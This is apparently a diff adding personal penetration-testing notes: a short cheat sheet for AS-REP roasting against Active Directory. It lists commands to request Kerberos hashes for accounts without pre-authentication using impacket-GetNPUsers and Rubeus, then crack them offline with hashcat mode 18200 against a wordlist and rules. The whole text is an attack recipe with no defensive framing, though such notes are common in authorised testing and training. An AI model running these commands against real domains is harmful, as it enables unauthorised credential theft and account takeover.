@@ -1,0 +1,9 @@
+#request output asreprpast
+impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile <hashes.asreproast> <domain>/<user>
+#crack with hashcat, get mode cracking
+hashcat --help | grep -i "Kerberos"
+#crack with hashcat
+sudo hashcat -m 18200 hashes.asreproast <rockyou> -r /usr/share/hashcat/rules/best64.rule --force
+#asreproast Rubeus
+.\Rubeus.exe asreproast /nowrap
+#after use hashcat as previous mentioned
